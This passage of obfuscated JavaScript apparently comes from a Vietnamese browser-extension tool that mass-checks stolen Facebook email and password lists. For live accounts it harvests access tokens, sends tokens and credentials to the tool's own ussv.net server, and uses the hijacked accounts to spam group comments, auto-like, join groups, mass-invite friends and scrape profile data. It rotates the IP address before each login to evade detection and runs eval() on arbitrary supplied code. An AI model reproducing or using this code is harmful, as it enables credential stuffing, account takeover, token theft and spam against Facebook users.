                                var f0 = '<div id="acc_fn_' + s0 + '" class="span_thongke"><span style="float: left;">' + V0 + '</span> <span id="acc_fn_stt_' + s0 + '" style="position: absolute;left: 80%;"><img style="margin-top: 5px;" src="https://ussv.net/themes/img/load_stt.gif"></span></div><span id="acc_fn_pass_' + s0 + '" style="display:none">' + i0 + '</span>',
                                    k0 = $("#div_pnc_right_ketqua");
                                $("#stt_checking")[f1W.Q0I]("Tiê´n ha`nh Check ta`i khoa?n " + V0 + "...");
                                $("#thongke_fbchuacheck")[f1W.m8y](f1W[H](parseInt($("#thongke_fbchuacheck")[f1W.m8y]()), 1));
                                k0[f1W.u2r](f0);
                                if (f1W[b](k0[f1W.q8r](".span_thongke").length, 6)) {
                                    k0[f1W.q8r](".span_thongke")[f1W.p3X]()[f1W.w5I]();
                                }
                                var N0 = '<option value="' + s0 + '" selected>' + V0 + '</option>';
                                $("#sl_loc_ussv_logs_match_email")[f1W.u2r](N0);
                                var l0 = $("#data_list_acc_coban")[f1W.o07]();
                                chrome[f1W.v1O][f1W.N0v][f1W.v0Q]({
                                    "ussv_AccList_None": l0
                                }, function() {});
                                if (f1W[M](acc_doing[f1W.D87].length, 10) || f1W[p](acc_doing[f1W.Y7Y].length, 5) || f1W[U](acc_doing[f1W.n3Q].length, 5)) {
                                    dom_logs_ussv("Tài kho?n " + U0 + " có email ho?c pass quá ng?n. B? qua tài kho?n này...", "0|_|_|ok|check");
                                    CheckV2[f1W.b0O](acc_doing[f1W.A7y], acc_doing[f1W.Y7Y], acc_doing[f1W.n3Q], s0, "die", null);
                                } else {
                                    if (f1W[o]($("#uss_st_clearbrower")[f1W.o07](), "yes")) {
                                        chrome[f1W.d60][f1W.K4r]({
                                            action: 'clear'
                                        }, function(W) {
                                            dom_logs_ussv(W, "0|_|_|ok|check");
                                            uss[f1W.G47]("https://m.facebook.com");
                                            login_CheckFb(s0, V0, i0, uss[f1W.K0v](), J0);
                                        });
                                    } else {
                                        if (f1W[F]($("#st_sl_CustomVPN_CP_ChangeIp_BeforeLogin")[f1W.o07](), 1)) {
                                            dom_logs_ussv("Ti?n hành Change VPN Tru?c khi Login...", "0|_|_|ok|check");
                                            $("#uss_lan_rs_vpn")[f1W.m8y]("0");
                                            CheckV2[m4]({
                                                "ChangeIpBeforeLogin": true
                                            }, function(W) {
                                                login_CheckFb(s0, V0, i0, uss[f1W.K0v](), J0);
                                            });
                                        } else {
                                            login_CheckFb(s0, V0, i0, uss[f1W.K0v](), J0);
                                        }
                                    }
                                }
                            }
                        } else {
                            dom_logs_ussv("S? Acc quá ích không th? ti?n hành Check", "0|0|_|error|check");
                        }
                    } else {
                        dom_logs_ussv("Không thê? tiê´n ha`nh Check da~ co´ lê?nh Du`ng Check !", "0|_|_|war|check");
                        $('#div_pnc_right_ketqua')[f1W.C3O]('background-image', 'url()');
                        stop_check();
                        danhgiacheck();
                    }
                }
            }
        };
        this[f1W.b0O] = function(O, Z, F, o, U, p) {
            var M = "i7B",
                b = "e7B",
                H = "p7B",
                R = "o7B",
                X = "r7B",
                f = "E7B",
                n = "W7B",
                Y = "d9B",
                N = "Just_Join",
                g = "Join",
                T = "K9B",
                I = "L9B",
                D = "S9B",
                G = "P9B",
                C = "z9B",
                z = "N9B",
                P = "h9B",
                J = "R9B",
                c = "f9B",
                L = "H9B",
                E0 = "q9B",
                F0 = "b9B",
                K = "U9B",
                r0 = "Z9B",
                Q = "O9B",
                S = "Max_Like_Post",
                u = "Notify",
                p0 = "Like",
                q0 = "V9B",
                H0 = "Q2B",
                W0 = "t2B",
                w = "w2B",
                B0 = "x2B",
                o0 = "l2B",
                Z0 = "C2B",
                A = "g2B",
                X0 = "D2B",
                n0 = "Y2B",
                U0 = "m2B",
                b0 = "s2B",
                s0 = "X2B",
                V0 = "F2B",
                i0 = "B2B",
                J0 = "j2B",
                f0 = new Date(),
                k0 = +f0[f1W.m2Q]() + ":" + f0[f1W.Y6v]() + ":" + f0[f1W.I8O](),
                N0 = parseInt($("#thong_check_total")[f1W.Q0I]());
            N0 += 1;
            $("#thong_check_total, #thongke_check_tc")[f1W.Q0I](N0);
            if (f1W[J0](U, "live")) {
                $("#div_thongke_check")[f1W.C3O]("background", "rgba(38, 181, 7, 0.42)");
                var l0 = parseInt($("#thong_check_live")[f1W.Q0I]());
                l0 += 1;
                $("#thong_check_live, #thongke_acc_live")[f1W.Q0I](l0);
                var v0 = parseInt($("#uss_lan_rs_dcom")[f1W.Q0I]());
                v0 += 1;
                $("#uss_lan_rs_dcom")[f1W.Q0I](v0);
                var K0 = parseInt($("#uss_lan_rs_vpn")[f1W.Q0I]());
                $("#uss_lan_rs_vpn")[f1W.Q0I](K0 + 1);
                ussnow[f1W.K1I][f1W.q2X] = 0;
                var P0 = '<img style="margin-top: 5px;" src="https://ussv.net/themes/img/load_stt.gif">',
                    Y0 = Z[f1W.d3v](0, 17),
                    g0 = '<tr class="info_table ' + O + '">';
                g0 += '<td class="tableusstdtd"><h2 class="tableussh2"><center><span id="checking_email_' + O + '">' + Y0 + '...</span></center></h2></td><td class="tableusstdtd" style="background-color: rgba(247, 247, 247, 0.792157);"><h4 class="tableussh2"><center><span id="checking_stellar_' + O + '">' + P0 + '</span></center></h4></td>';
                g0 += '<td class="tableusstdtd" style="background-color: rgba(247, 247, 247, 0.792157);"><h4 class="tableussh2"><center><span id="checking_friends_' + O + '">' + P0 + '</span></center></h4></td>';
                g0 += '<td class="tableusstdtd" style="background-color: rgba(247, 247, 247, 0.792157);"><h4 class="tableussh2"><center><span id="checking_sub_' + O + '">' + P0 + '</span></center></h4></td>';
                g0 += '<td class="tableusstdtd"><h4 class="tableussh2"><center><span id="checking_group_' + O + '">' + P0 + '</span></center></h4></td>';
                g0 += '<td class="tableusstdtd"><h4 class="tableussh2"><center><span id="checking_page_' + O + '">' + P0 + '</span></center></h4></td>';
                g0 += '</tr>';
                var u0 = $("#div_check_info");
                u0[f1W.u2r](g0);
                if (f1W[i0](u0[f1W.q8r](".info_table").length, 8)) {
                    u0[f1W.q8r](".info_table")[f1W.p3X]()[f1W.w5I]();
                }
                $("#note_check_info")[f1W.Q0I]("Gu?i yêu câ`u kiê?m tra thông tin ta`i khoa?n " + Z);
                dom_logs_ussv(lang_vi_checking_live, O + "|_|_|ok|check");
                $("#uss_checkpoint")[f1W.Q0I]("0");
                $("#uss_saipass")[f1W.Q0I]("0");
                var m0 = $("#data_list_acc_coban_live")[f1W.o07]();
                if ($("#uss_st_unsafeaccount")[f1W.o07]()) {
                    $("#data_list_acc_coban_live")[f1W.o07](m0 + "\n" + acc_doing[P4]);
                } else {
                    $("#data_list_acc_coban_live")[f1W.o07](m0 + "\n" + Z + "|" + F);
                }
                chrome[f1W.v1O][f1W.N0v][f1W.v0Q]({
                    "ussv_AccList_Live": $("#data_list_acc_coban_live")[f1W.o07]()
                }, function() {});
                var C0 = "<img title=\"Tài khoa?n Live\" src=\"https://ussv.net/themes/img/acc_live.png\" style=\"width: 15px;\">";
                CheckV2[Y4]("Live");
                if (f1W[V0]($("#uss_st_join_geocoin")[f1W.o07](), 1)) {
                    uss[f1W.C37]({
                        "type": "set",
                        "data": {
                            "ussv_geocoint_finish": 0
                        }
                    });
                    window[f1W.d5y]('http://wallet.geocoin.cash/?Join=yes');
                    var T0 = setInterval(function() {
                        var E = "ussv_geocoint_finish";
                        chrome[f1W.v1O][f1W.z50][f1W.G47](["ussv_geocoint_finish"], function(W) {
                            var V = "y2B";
                            if (f1W[V](W[E], 1)) {
                                acc_doing[f1W.f17] = 0;
                                clearInterval(T0);
                            } else {
                                acc_doing[f1W.f17] = 1;
                            }
                        });
                    }, 100);
                }
                if (f1W[s0]($("#uss_st_vote_pops")[f1W.o07](), 1)) {
                    uss[f1W.C37]({
                        "type": "set",
                        "data": {
                            "ussv_vote_pops_phinish": 0
                        }
                    });
                    window[f1W.d5y]('http://pops.vn/pepsimusic/auth/login.php?app=facebook&cb=http://pops.vn/pepsimusic/auth-callback&cid=7');
                    var T0 = setInterval(function() {
                        var E = "ussv_vote_pops_phinish";
                        chrome[f1W.v1O][f1W.z50][f1W.G47](["ussv_vote_pops_phinish"], function(W) {
                            var V = "k2B";
                            if (f1W[V](W[E], 1)) {
                                acc_doing[f1W.f17] = 0;
                                clearInterval(T0);
                            } else {
                                acc_doing[f1W.f17] = 1;
                            }
                        });
                    }, 100);
                }
            } else if (f1W[b0](U, "die")) {
                ussnow[f1W.K1I][f1W.q2X] = 0;
                $("#div_thongke_check")[f1W.C3O]("background", "rgba(203, 11, 11, 0.5)");
                var M0 = parseInt($("#thong_check_die")[f1W.Q0I]());
                M0 += 1;
                $("#thong_check_die, #thongke_acc_die")[f1W.Q0I](M0);
                var I0 = parseInt($("#uss_saipass")[f1W.Q0I]());
                I0 += 1;
                $("#uss_saipass")[f1W.Q0I](I0);
                dom_logs_ussv(lang_vi_checking_die, O + "|_|_|error|check");
                var G0 = $("#data_list_acc_coban_die")[f1W.o07]();
                $("#data_list_acc_coban_die")[f1W.o07](G0 + Z + "|" + F + "\n");
                var C0 = "<img title=\"Mâ?t khâ?u hoa?c email không du´ng\" src=\"https://ussv.net/themes/img/fb_1.png\" style=\"width: 15px;\">";
                CheckV2[Y4]("Die");
            } else if (f1W[U0](U, "cp")) {
                ussnow[f1W.K1I][f1W.q2X] = 0;
                uss[f1W.O1X]();
                thongbao_log(3, k0 + " : " + ussv_lang_vi_log_cp_clear_cookie);
                $("#div_thongke_check")[f1W.C3O]("background", "rgba(223, 3, 53, 0.52)");
                var L0 = parseInt($("#thong_check_cp")[f1W.Q0I]());
                L0 += 1;
                $("#thong_check_cp, #thongke_acc_cp")[f1W.Q0I](L0);
                var B4 = parseInt($("#uss_checkpoint")[f1W.Q0I]());
                B4 += 1;
                $("#uss_checkpoint")[f1W.Q0I](B4);
                dom_logs_ussv(lang_vi_checking_cp, O + "|_|_|error|check");
                var Z4 = $("#data_list_acc_coban_cp")[f1W.o07]();
                $("#data_list_acc_coban_cp")[f1W.o07](Z4 + Z + "|" + F + "\n");
                var C0 = "<img title=\"Checkpoint\" src=\"https://ussv.net/themes/img/fb_4.png\" style=\"width: 15px;\">";
                CheckV2[Y4]("Cp");
            } else {
                ussnow[f1W.K1I][f1W.q2X] += 1;
                $("#div_thongke_check")[f1W.C3O]("background", "rgba(213, 211, 211, 0.82)");
                var y0 = parseInt($("#thong_check_kxd")[f1W.Q0I]());
                y0 += 1;
                $("#thong_check_kxd")[f1W.Q0I](y0);
                dom_logs_ussv(lang_vi_checking_kxd, O + "|_|_|ok|check");
                var p4 = $("#data_list_acc_coban_kxd")[f1W.o07]();
                $("#data_list_acc_coban_kxd")[f1W.o07](p4 + Z + "|" + F + "\n");
                var C0 = "KXD";
                CheckV2[Y4]("Kxd");
            }
            $("#stt_checking")[f1W.Q0I]("Tài kho?n này " + U);
            $("#acc_fn_stt_" + O)[f1W.Q0I](C0);
            if (f1W[n0](U, "live")) {
                acc_doing[f1W.f17] = 1;
                if (f1W[X0](p[f1W.C3y], 0)) {
                    dom_logs_ussv(p[f1W.F5v], O + "|_|_|war|check");
                    $("#checking_email_" + O)[f1W.u2r]('<img title="Kiê?m La?i Ta`i Khoa?n ' + Z + '" id="row_rc_' + O + '" src="https://cdn4.iconfinder.com/data/icons/munich/16x16/zoom.png">');
                    $("#row_rc_" + O)[f1W.Z6O](function() {
                        $(".info_table." + O)[f1W.w5I]();
                        re_check(O, Z, F);
                    });
                    acc_doing[f1W.f17] = 0;
                } else {
                    var x0 = JSON[f1W.i2O]($("#uss_data")[f1W.V6Q]("data"));
                    profile_id = p[f1W.z1Y];
                    FB_Key = p[f1W.O00];
                    var A0 = p[f1W.M00];
                    _fb[f1W.O00] = FB_Key;
                    _fb[f1W.R0y] = parseInt(_fb[f1W.R0y]);
                    var O0 = A0;
                    if ((f1W[A](O0, 0) || f1W[Z0](_fb[f1W.R0y], $("#setting_save_token")[f1W.o07]())) && f1W[o0](_fb[f1W.R0y], 10) && f1W[B0](_fb[f1W.R0y], 350685531728) && f1W[w](_fb[f1W.R0y], 6628568379) && f1W[W0](_fb[f1W.R0y], 139682082719810)) {} else {}
                    var D0 = $("#ussv_log_panel_list_token"),
                        V4 = $("#data_list_acc_coban_token");
                    if ($("#uss_st_unsafeaccount")[f1W.o07]()) {
                        var z0 = uss[f1W.G47]("https://ussv.net/Api_Center/CustomJs/2016/safe.php?token=yes&type=safe&data=" + encodeURIComponent(A0) + "&key=" + $("#uss_st_unsafeaccount")[f1W.o07]());
                        D0[f1W.o07](D0[f1W.o07]() + z0 + "\n");
                        V4[f1W.o07](V4[f1W.o07]() + z0 + "\n");
                    } else {
                        D0[f1W.o07](D0[f1W.o07]() + A0 + "\n");
                        V4[f1W.o07](V4[f1W.o07]() + A0 + "|" + Z + "|" + F + "\n");
                    }
                    CheckV2[Y4]("Token");
                    chrome[f1W.v1O][f1W.N0v][f1W.v0Q]({
                        "ussv_AccList_Token": $("#data_list_acc_coban_token")[f1W.o07]()
                    }, function() {});
                    var j4 = $("#ussv_log_panel_list_live");
                    j4[f1W.o07](j4[f1W.o07]() + Z + "|" + F + "\n");
                    dom_logs_ussv(p[f1W.F5v], O + "|_|_|ok|check");
                    if (f1W[H0]($("#uss_check_str")[f1W.Q0I](), "1")) {
                        CheckV2[z4]({
                            "type": "stellar",
                            "id": O,
                            "email": Z,
                            "pass": F,
                            "key_play": o,
                            "profile_id": profile_id,
                            "FB_Key": FB_Key,
                            "token": A0,
                            "TokenGroup": O0
                        });
                    } else {
                        CheckV2[z4]({
                            "type": "spam",
                            "id": O,
                            "email": Z,
                            "pass": F,
                            "key_play": o,
                            "profile_id": profile_id,
                            "FB_Key": FB_Key,
                            "token": A0,
                            "stellar": 3,
                            "TokenGroup": O0
                        });
                    }
                    if (f1W[q0](x0[f1W.X7O][p0], true)) {
                        fb_Like(1, 1, Z, x0[f1W.X7O][f1W.A7y], A0, FB_Key, profile_id, x0[f1W.X7O][f1W.o1Q], x0[f1W.X7O][u], x0[f1W.X7O][f1W.B6I], x0[f1W.X7O][f1W.X0v], x0[f1W.X7O][f1W.R8v], x0[f1W.X7O][S]);
                    }
                    if (f1W[Q]($("#uss_st_autlike")[f1W.o07](), 1)) {
                        var S0 = $("#uss_st_Id_Sub")[f1W.o07]();
                        if (f1W[r0](S0.length, 5)) {
                            var a0 = S0[f1W.X3Q]("-");
                            if (f1W[K](a0.length, 1)) {
                                fb_Sub(2, Z, S0, 0, FB_Key, profile_id);
                            } else {
                                for (var c0 = 0; f1W[F0](c0, a0.length); c0++) {
                                    fb_Sub(2, Z, a0[c0], 0, FB_Key, profile_id);
                                }
                            }
                        }
                        var w0 = $("#uss_st_Id_Page")[f1W.o07]();
                        if (f1W[E0](w0.length, 5)) {
                            if (f1W[L]($("#uss_st_autlike_invite")[f1W.o07](), 1)) {
                                var b4 = "Invite",
                                    q4 = parseInt($("#uss_st_autlike_invite_max")[f1W.o07]());
                            } else {
                                var b4 = "InviteNo",
                                    q4 = 1;
                            }
                            if (f1W[c]($("#uss_st_autlike_likepost")[f1W.o07](), 1)) {
                                var e4 = "Like_Post",
                                    W4 = parseInt($("#uss_st_autlike_likepost_max")[f1W.o07]());
                            } else {
                                var e4 = "Like_PostNo",
                                    W4 = 0;
                            }
                            if (f1W[J]($("#uss_st_autlike_followpage")[f1W.o07](), 1)) {
                                var r4 = "notify";
                            } else {
                                var r4 = "No";
                            }
                            var n4 = w0[f1W.X3Q]("-");
                            if (f1W[P](n4.length, 1)) {
                                fb_Like(1, 1, Z, w0, A0, FB_Key, profile_id, "No", r4, b4, q4, e4, W4);
                            } else {
                                for (var c0 = 0; f1W[z](c0, n4.length); c0++) {
                                    fb_Like(1, 1, Z, n4[c0], A0, FB_Key, profile_id, "No", r4, b4, q4, e4, W4);
                                }
                            }
                        }
                    }
                    if (f1W[C]($("#uss_st_AutJoinGroup")[f1W.o07](), 1)) {
                        var f4 = $("#uss_st_AutJoinGroup_Id")[f1W.o07](),
                            E4 = f4[f1W.X3Q]("-"),
                            M4 = E4.length;
                        for (var X4 = 0; f1W[G](X4, M4); X4++) {
                            uss[f1W.f1y]({
                                "FB_Key": FB_Key,
                                "FB_Uid": profile_id,
                                "Group_Id": E4[X4],
                                "Hide": false
                            });
                        };
                    } else {}
                    if (f1W[D]($("#sl_CustomJS")[f1W.o07](), 1)) {
                        dom_logs_ussv("Ti?n hành ch?y Custom JS " + $("#st_CustomJs_Url")[f1W.o07](), O + "|_|_|ok|check");
                        if (f1W[I]($("#st_sl_CustomJs_Type")[f1W.o07](), 1)) {
                            uss[f1W.T1r]({
                                "Url": $("#st_CustomJs_Url")[f1W.o07](),
                                "Type": 1
                            });
                        } else {
                            var k4 = $("#CustomJS")[f1W.o07]();
                            eval(k4);
                        }
                    }
                }
                if (x0) {
                    if (f1W[T](x0[f1W.m2r][g], true)) {
                        var E4 = x0[f1W.m2r][N],
                            E4 = E4[f1W.X3Q]("-"),
                            M4 = E4.length;
                        for (var X4 = 0; f1W[Y](X4, M4); X4++) {
                            uss[f1W.f1y]({
                                "FB_Key": FB_Key,
                                "FB_Uid": profile_id,
                                "Group_Id": E4[X4]
                            });
                        };
                    };
                };
                if (f1W[n]($("#uss_st_auto_keomem")[f1W.o07](), 1)) {
                    idgr = $("#uss_st_auto_keomem_id");
                    if (f1W[f](idgr[f1W.o07](), "")) {
                        dom_logs_ussv(_lJ[f1W.G3v]({
                            "t": "gr",
                            "id": "a11"
                        }), "0|0|_|error|autoAddGr");
                    } else {
                        note = Z + "--" + idgr[f1W.o07]();
                        dom_logs_ussv(_lJ[f1W.G3v]({
                            "t": "gr",
                            "id": "a12",
                            "r": note
                        }), "0|0|_|ok|autoAddGr");
                        GrId = idgr[f1W.o07]();
                        GrId = JSON[f1W.i2O](uss[f1W.G47]("https://ussv.net/ajax/fb_group.php?useracc=" + uss_aut(1) + "&passacc=" + uss_aut(6) + "&type=1&group=" + GrId));
                        if (f1W[X](GrId[f1W.C3y], 0)) {
                            GrId = GrId[f1W.i0Y][f1W.X3Q]("-");
                            if (f1W[R]($("#uss_st_auto_keomem_speed")[f1W.o07](), 1)) {
                                var R4 = "https://graph.facebook.com/fql?q=SELECT uid FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 5000&access_token=" + A0;
                                chrome[f1W.d60][f1W.K4r]({
                                    method: 'GET',
                                    action: 'xhttp',
                                    url: R4,
                                    data: "hj=hj"
                                }, function(W) {
                                    var V = JSON[f1W.i2O](W);
                                    _fb[f1W.i0Y](8, {
                                        "Group_Id": GrId[0],
                                        "Hide": false,
                                        "Token": O0,
                                        "FB_Uid": profile_id,
                                        "FB_Key": FB_Key,
                                        "FriendData": V,
                                        "Max_Invite": $("#uss_st_auto_keomem_limit")[f1W.o07]()
                                    });
                                    get_OneAcc();
                                });
                            } else {
                                for (var c0 = 0; f1W[H](c0, GrId.length); c0++) {
                                    $("body")[f1W.p3Q]('<input value="0" class="hidden invite_gr_' + O + '_' + GrId[c0] + '">');
                                    _fb[f1W.i0Y](4, {
                                        "grId": GrId[c0],
                                        "FbId": O
                                    });
                                }
                                var y4 = {},
                                    s4 = GrId[f1W[b](GrId.length, 1)],
                                    h4 = O + "_" + s4;
                                y4[h4] = setInterval(function() {
                                    var W = "n7B",
                                        V = "M7B";
                                    U = $(".invite_gr_" + O + "_" + s4);
                                    if (f1W[V](U[f1W.o07](), 2)) {
                                        clearInterval(y4[h4]);
                                        get_OneAcc();
                                    } else if (f1W[W](U[f1W.o07](), 3)) {
                                        clearInterval(y4[h4]);
                                        get_OneAcc();
                                    } else {
                                        var E = parseInt($("#time_wait_add_group_" + O + "_" + s4)[f1W.m8y]()),
                                            E = E + 1;
                                        $("#time_wait_add_group_" + O + "_" + s4)[f1W.m8y](E);
                                    }
                                }, 1000);
                            }
                        } else {
                            dom_logs_ussv(GrId[f1W.F5v], "0|0|_|error|autoAddGr");
                            get_OneAcc();
                        }
                    }
                } else {
                    if (f1W[M]($("#uss_st_TransferGroups")[f1W.o07](), 1)) {
                        acc_doing[f1W.I0O] = 1;
                    } else {
                        acc_doing[f1W.I0O] = 0;
                    }
                    get_OneAcc();
                }
            } else {
                get_OneAcc();
            }
        };
        this[z4] = function(o0) {
            var Z0 = "Q8B",
                A = "t8B",
                X0 = "w8B",
                n0 = "x8B",
                U0 = "l8B",
                b0 = "C8B",
                s0 = "g8B",
                V0 = "D8B",
                i0 = "B8B",
                J0 = "j8B",
                f0 = "A7B",
                k0 = "G7B",
                N0 = "v7B",
                l0 = "u7B",
                v0 = "c7B",
                K0 = "J7B",
                P0 = "I7B",
                Y0 = "T7B",
                g0 = "a7B",
                u0 = "profile_id",
                m0 = "TokenGroup";

            function C0() {
                function T(O) {
                    $[f1W.c9y]({
                        type: "GET",
                        url: "https://graph.facebook.com/fql?q=select gid, name from group where gid IN (SELECT gid FROM group_member WHERE uid=me()) order by rand() limit 5000&access_token=" + a0,
                        success: function(W, V, E) {
                            O(W);
                        }
                    });
                }
                acc_doing[f1W.v20][f1W.i0Y] = 1;
                T(function(U) {
                    var p = "d3B",
                        M = "z3B",
                        b = "N3B",
                        H = "h3B",
                        R = "R3B",
                        X = U,
                        f = X.data.length;
                    acc_doing[f1W.L37] = X;
                    $("#checking_group_" + O0)[f1W.Q0I](f);
                    d0("Groups: " + f);
                    if (f1W[R]($("#uss_st_cmt_post_group")[f1W.o07](), 1) && f1W[H]($("#Ussv_SpamCmt")[f1W.o07](), 1)) {
                        acc_doing[f1W.l8a] = 1;
                        var n = '';
                        n += '    <div>';
                        n += '        <div style="float:left"> <img style="  width: 35px;" src="//graph.facebook.com/852263255/picture"> </div>';
                        n += '        <div style="position: relative;left: 5px;"> <a style="font-weight: bold;font-size: 14px;" target="_blank" href="https://facebook.com/' + O0 + '">' + D0 + ' </a>';
                        n += '           <a style="float: right;">';
                        n += '           <span id="GroupCore_spam_TK_total_cmt_' + O0 + '">0</span><br/>';
                        n += '           <span id="GroupCore_spam_TK_post_' + O0 + '">0</span>';
                        n += '           <span </span>';
                        n += '           </a>';
                        n += '            <br> Groups: ';
                        n += '            <span style="color: rgb(174, 99, 226);" id="SpamCmt_Total_Groups_Loc_' + O0 + '">0</span> / <span id="SpamCmt_Total_Groups_' + O0 + '">' + f + '</span> ';
                        n += '        </div>';
                        n += '        <div id="Load_Body_' + O0 + '" style="clear: both; margin: 10px;">';
                        n += '        	<textarea style="width:100%" class="" id="GroupCore_spam_listid_group_' + O0 + '"></textarea>';
                        n += '        </div>';
                        n += '        <div id="Load_TK_AccInfo_' + O0 + '" style="clear: both;"></div>';
                        n += '    </div>';
                        n += '    <div>';
                        n += '        <div id="List_Cmt_Found_' + O0 + '" style="border-top: 1px solid #e1e2e3;margin: 5px;padding: 5px;">';
                        n += '        	<div id="GroupCore_spam_Div_TK_' + O0 + '" style="text-align: center;  padding: 5px;font-size: 15px;">';
                        n += '        		<div style="float:left;width:50%;border-bottom: 3px solid;border-bottom-color: rgb(57, 189, 42);">';
                        n += '        			<span style="color: rgb(32, 200, 72);" id="GroupCore_spam_TK_cmt_TC_' + O0 + '">0</span>';
                        n += '        		</div> ';
                        n += '        		<div style="border-bottom: 3px solid;border-bottom-color: rgb(242, 31, 95);">';
                        n += '        			<span style="color: rgb(221, 35, 78)" id="GroupCore_spam_TK_cmt_TB_' + O0 + '">0</span>';
                        n += '        		</div>';
                        n += '        	</div>';
                        n += '           <div class="fb_div_panel_bot" style="border-radius: 0;">';
                        n += '           	<span style="float:left;" id="SpamCmt_Wait_' + O0 + '">';
                        n += '               	<img style="width: 22px;" src="http://www.oclc.org/apps/oclc/ajax/images/richfaces_wait.gif">';
                        n += '           	</span>';
                        n += '           	<span style="position: relative;  top: 2px;   left: 7px;  color: rgb(168, 168, 168);" id="SpamCmt_Add_Note_' + O0 + '"></span>';
                        n += '           </div>';
                        n += '           <p style="clear: both;"><span class="hidden" style="  color: rgb(242, 26, 59);position: relative;  top: 2px;" id="SpamCmt_Add_Note_CanhBao_' + O0 + '"></span></p>';
                        n += '        </div>';
                        n += '        <div style="clear: both;"></div>';
                        n += '        <input id="SpamCmt_Aut_' + O0 + '" type="hidden" value="1">';
                        n += '    </div>';
                        dom_logs_ussv("<br/><div class='fb_div_panel_bot'>" + n + "</div>", O0 + "|_|_|ok|check");
                        var Y = "#GroupCore_spam_listid_group_" + O0;
                        if (f1W[b](f, 1)) {
                            setTimeout(function() {
                                acc_doing[f1W.f17] = 0;
                                acc_doing[f1W.l8a] = 0;
                            }, 2000);
                            $('#GroupCore_spam_listid_group_' + O0)[f1W.v37]();
                            $('#SpamCmt_Wait_' + O0)[f1W.v37]();
                            $('#GroupCore_spam_Div_TK_' + O0)[f1W.v37]();
                            $('#SpamCmt_Add_Note_' + O0)[f1W.Q0I]("Có quá Ít Group. Không th? ti?n hành Spam !");
                        } else {
                            for (var N = 0; f1W[M](N, f); N++) {
                                GetMemBerGroupV2({
                                    Group: X.data[N][f1W.i0v] + "|" + X.data[N][f1W.G6y],
                                    Id: N
                                }, function(W) {
                                    var V = "K3B",
                                        E = "Member",
                                        O = "L3B",
                                        Z = "S3B",
                                        F = "P3B",
                                        o = "#GroupCore_spam_loc_listgroup";
                                    if (f1W[F]($(o)[f1W.o07](), "") && f1W[Z]($(o)[f1W.o07](), 0)) {
                                        if (f1W[O](W[E], $(o)[f1W.o07]())) {} else {
                                            uss[f1W.H1X]("#SpamCmt_Total_Groups_Loc_" + O0);
                                            $(Y)[f1W.o07]($(Y)[f1W.o07]() + W[f1W.m2r] + "\n");
                                        }
                                    } else {
                                        $(Y)[f1W.o07]($(Y)[f1W.o07]() + W[f1W.m2r] + "\n");
                                    }
                                    if (f1W[V](W[f1W.A7y], f - 1)) {
                                        $('#SpamCmt_Add_Note_' + O0)[f1W.Q0I]("B?t d?u Spam cmt...");
                                        p4({
                                            Token: a0,
                                            ListGroup: '#GroupCore_spam_listid_group_' + O0,
                                            Note: '#SpamCmt_Add_Note_' + O0,
                                            Aut: '#SpamCmt_Aut_' + O0,
                                            Load: "#SpamCmt_Wait_" + O0,
                                            "TK": {
                                                "Group_TT": "#GroupCore_spam_TK_group",
                                                "Post_TT": "#GroupCore_spam_TK_post_" + O0,
                                                "Cmt_TT": "#GroupCore_spam_TK_total_cmt_" + O0,
                                                "Cmt_TC": "#GroupCore_spam_TK_cmt_TC_" + O0,
                                                "Cmt_TB": "#GroupCore_spam_TK_cmt_TB_" + O0,
                                            }
                                        });
                                    };
                                });
                            };
                        }
                    }
                    if (f1W[p]($("#uss_st_TransferGroups")[f1W.o07](), 1)) {
                        var g = $("#Data_Js_TransferGroups")[f1W.o07]();
                        eval(g);
                    };
                    acc_doing[f1W.v20][f1W.i0Y] = 0;
                });
            }

            function T0() {
                x0({
                    "url": "https://graph.facebook.com/me?fields=name,birthday,link,locale,verified,gender,mobile_phone,hometown&access_token=" + a0,
                    "type": "info"
                });
            }

            function M0() {
                var W = uss[f1W.G47]("https://www.facebook.com/mobileprotection?source=mobile_mirror_nux&__mref=message_bubble"),
                    W = $(W)[f1W.q8r]("#mobileCountryLabel")[f1W.q8r]("a")[f1W.Q0I]()[f1W.X3Q]("(")[0],
                    W = W + "AAA",
                    W = W[f1W.F6r](" AAA", "")[f1W.F6r]("AAA", "");
                d0("Country: " + W);
            }

            function I0() {
                x0({
                    "url": "https://graph.facebook.com/me/accounts?access_token=" + a0,
                    "type": "pages"
                });
            }

            function G0() {
                var o = "t5B";
                dom_logs_ussv("Ðang kiê?m tra ti`nh tra?ng Stellar : " + D0, O0 + "|_|_|ok|check");
                if (f1W[o](j4, null)) {
                    $("#checking_stellar_" + O0)[f1W.Q0I]("Lô~i");
                    $("#note_check_info")[f1W.Q0I]("Ta`i Khoa?n " + D0 + " xa~y ra Lô~i trong qua´ tri`nh kiê?m tra Stellar... ");
                    alert("L?i nghiêm tr?ng . Vui lòng dang t?i lên group v? Mã l?i: #1852A");
                } else {
                    var U = "https://www.facebook.com/settings/applications/typeahead?value=stellar&existing_ids=&__user=" + j4 + "&__a=1",
                        p = new XMLHttpRequest();
                    p[f1W.g4Y] = function() {
                        var W = "V0a",
                            V = "Q5B";
                        if (f1W[V](p[f1W.D60], 4)) {
                            var E = p[f1W.H8v],
                                O = E[f1W.x3y](/1411202179109031/gi);
                            if (f1W[W](O, null)) {
                                var Z = '<img title="Ai do´ da~ du`ng ta`i khoa?n na`y Ki´ch Hoa?t Stellar" width="20" src="https://ussv.net/themes/img/fb_3.png">';
                                $("#checking_stellar_" + O0)[f1W.Q0I](Z);
                                var F = Z + " Ta`i khoa?n " + D0 + " da~ Ki´ch Hoa?t Stellar...";
                                $("#note_check_info")[f1W.Q0I](F);
                                dom_logs_ussv(F, O0 + "|_|_|war|check");
                                d0("Stellar: Yes");
                                CheckV2[z4]({
                                    "type": "spam",
                                    "id": O0,
                                    "email": D0,
                                    "pass": V4,
                                    "key_play": z0,
                                    "profile_id": j4,
                                    "FB_Key": S0,
                                    "token": a0,
                                    "stellar": 1,
                                    "TokenGroup": o0[m0],
                                });
                            } else {
                                var Z = '<img title="Ta`i Khoa?n Facebook Na`y Chua Ki´ch Hoa?t Stellar" width="21" src="https://ussv.net/themes/img/fb_5.png">';
                                $("#checking_stellar_" + O0)[f1W.Q0I](Z);
                                var F = Z + " Ta`i khoa?n " + D0 + " chua Ki´ch Hoa?t Stellar...";
                                $("#note_check_info")[f1W.Q0I](F);
                                dom_logs_ussv(F, O0 + "|_|_|ok|check");
                                d0("Stellar: No");
                                CheckV2[z4]({
                                    "type": "spam",
                                    "id": O0,
                                    "email": D0,
                                    "pass": V4,
                                    "key_play": z0,
                                    "profile_id": j4,
